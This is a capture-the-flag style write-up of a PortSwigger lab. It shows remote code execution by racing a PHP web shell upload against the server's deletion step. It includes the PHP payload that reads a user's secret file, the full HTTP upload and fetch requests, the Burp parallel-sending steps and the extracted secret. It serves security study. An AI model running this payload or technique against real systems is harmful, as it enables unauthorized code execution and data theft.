# PortSwigger Expert Lab: Race Condition File Upload Bypass

**Author:** Neelesh Pandey  
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Expert  
**Category:** File Upload + Race Condition  
**Lab:** Remote code execution via web shell upload  

---

## Overview

This lab demonstrates a sophisticated attack that combines two vulnerability classes — **file upload validation bypass** and **race condition exploitation**. The server correctly validates uploaded files and deletes malicious ones, but a narrow execution window between upload and deletion can be exploited to execute arbitrary code.

This is not a simple upload bypass. The server's validation works correctly — the bypass exists purely in the **timing** of the request, not a flaw in the validation logic itself.

---

## The Core Concept — Why This Works

Most file upload labs involve tricking the server's validation (wrong content-type, blacklist bypass, polyglot files). This lab is different. The validation here actually works — it correctly detects and deletes the PHP file.

The vulnerability is in the **execution order:**

\`\`\`
1. File is uploaded → temporarily saved to disk
2. Server validates the file
3. If invalid → file is deleted
\`\`\`

Between steps 1 and 3, there is a tiny window where the file **exists on disk and is executable**. If you can send a GET request to that file during this window — before deletion — the PHP code executes.

This is a **Time-of-Check to Time-of-Use (TOCTOU)** race condition.

---

## Why Previous Techniques Failed

Before reaching the race condition approach, standard bypass techniques were attempted and failed:

| Technique | Result | Why |
|-----------|--------|-----|
| Content-Type: image/jpeg with PHP payload | Blocked | Server validated file content, not just header |
| Double extension (exploit.php.jpg) | Blocked | Server parsed the real extension correctly |
| Null byte injection (exploit.php%00.jpg) | Blocked | Modern server, not vulnerable to null bytes |
| Polyglot (JPEG + PHP) | Blocked | Server stripped/rejected executable content |

The server's validation was genuinely robust against all standard bypasses. The attack surface was not the validation logic — it was the **timing** between upload and validation.

---

## Reconnaissance

### Step 1 — Understand Normal File Upload Flow

Logged in and uploaded a legitimate image as avatar. Intercepted in Burp Proxy:

\`\`\`
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="avatar"; filename="avatar.jpg"
Content-Type: image/jpeg

<image data>
------boundary--
\`\`\`

The uploaded file was fetched via:

\`\`\`
GET /files/avatars/avatar.jpg HTTP/1.1
\`\`\`

**Key observation:** Files are stored at `/files/avatars/<filename>` — meaning if a PHP file were to exist there even briefly, the server would execute it.

### Step 2 — Craft the Malicious Payload

Created `exploit.php` containing:

\`\`\`php
<?php echo file_get_contents('/home/carlos/secret'); ?>
\`\`\`

This reads and outputs the contents of Carlos's secret file when executed server-side.

---

## Exploitation — Race Condition via Burp Intruder

### The Strategy

Send the POST upload request and multiple GET fetch requests **simultaneously** so that at least one GET request hits the file during the window between upload and deletion.

### Step 1 — Capture Both Requests in Burp

Captured two requests in Proxy > HTTP History:

**Request 1 — POST upload (malicious PHP):**
\`\`\`
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=<your-session>
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------boundary--
\`\`\`

**Request 2 — GET fetch (attempt execution):**
\`\`\`
GET /files/avatars/exploit.php HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=<your-session>
\`\`\`

### Step 2 — Burp Intruder + Repeater Parallel Setup

Sent the POST request to Burp Intruder and the GET request to Burp Repeater. Duplicated the GET tab 4 times to create 5 parallel GET requests. Used Repeater's **"Send group in parallel"** feature combined with Intruder to fire all requests as close to simultaneously as possible:

\`\`\`
Step 1: Send POST /my-account/avatar → Burp Intruder
Step 2: Send GET /files/avatars/exploit.php → Burp Repeater
Step 3: Duplicate the GET tab 4 times (right-click tab → Duplicate)
Step 4: Select all GET tabs → right-click → "Send group in parallel"
Step 5: Simultaneously trigger the POST from Intruder
Step 6: One of the parallel GETs hits the race window → PHP executes
\`\`\`

**Why parallel sending matters:**

| Method | Problem |
|--------|---------|
| Normal Repeater (single) | Sequential — file already deleted by the time GET arrives |
| Intruder default | Requests fire at different times — misses the window |
| Repeater "Send group in parallel" | All GETs fire simultaneously — maximises chance of hitting window |

### Step 3 — Results

After running the attack, the results showed mixed responses:

| Request | Response | Body |
|---------|----------|------|
| POST /my-account/avatar | 200 | Avatar uploaded |
| GET /files/avatars/exploit.php | 404 | File not found (deleted before request hit) |
| GET /files/avatars/exploit.php | 404 | File not found |
| GET /files/avatars/exploit.php | **200** | **aBj51Bn1ujvZn3o1ZiM2SJq2reLJETLX** |
| GET /files/avatars/exploit.php | 404 | File not found |
| GET /files/avatars/exploit.php | 404 | File not found |

One GET request hit the execution window — the file existed on disk, PHP executed, and Carlos's secret was returned.

**Secret extracted:** `aBj51Bn1ujvZn3o1ZiM2SJq2reLJETLX`

---

## Attack Flow Summary

\`\`\`
1. Upload exploit.php via POST ──────────────────────────────┐
                                                              ↓
2. File saved to /files/avatars/exploit.php          [RACE WINDOW]
                                                              ↓
3. Server begins validation ──── GET requests fire ──→ PHP executes
                                                              ↓
4. Validation completes → file deleted               Secret returned
\`\`\`

The race window is typically a few milliseconds. Burp Repeater's **"Send group in parallel"** feature ensures all GET requests fire simultaneously, maximising the chance of hitting that window.

---

## Why Parallel Sending is Critical

Without parallel sending, requests arrive sequentially — GETs either all arrive before the upload completes (404) or all after deletion (404). Sending the group in parallel ensures all GETs arrive within the same millisecond window as the POST.

> **Note:** This attack is probabilistic. One in five GET requests hit the window here. If all return 404, repeat the attack — the race window exists, it just needs to be hit.

---

## Key Takeaways

- **Race conditions exist in validation logic, not just business logic** — any server that temporarily stores a file before validating it is potentially vulnerable
- **A bypass does not always mean fooling the filter** — the filter worked correctly here; the vulnerability was purely in the timing gap
- **Burp's native parallel sending handles race conditions** — no extensions needed; Repeater's "Send group in parallel" is built for exactly this
- **This attack is probabilistic** — one in five succeeded here; repeat if needed or increase the number of parallel GET requests
- **TOCTOU applies beyond file upload** — password reset tokens, 2FA windows, and coupon redemption are all potentially vulnerable

---

## Real-World Relevance

This attack pattern appears in real applications wherever:
- Files are temporarily stored before asynchronous validation (virus scanning, content moderation)
- Cloud storage pre-signed URLs have delayed permission checks
- CDN edge caches serve files before origin validation completes

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Proxy, HTTP history, request capture |
| Burp Intruder | Upload POST request triggering |
| Burp Repeater (parallel group) | Simultaneous GET requests to hit the race window |
| PHP | Payload language for server-side code execution |

---

## References

- [PortSwigger — Race Conditions](https://portswigger.net/web-security/race-conditions)
- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [TOCTOU Race Conditions — OWASP](https://owasp.org/www-community/vulnerabilities/Time_of_check_time_of_use)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
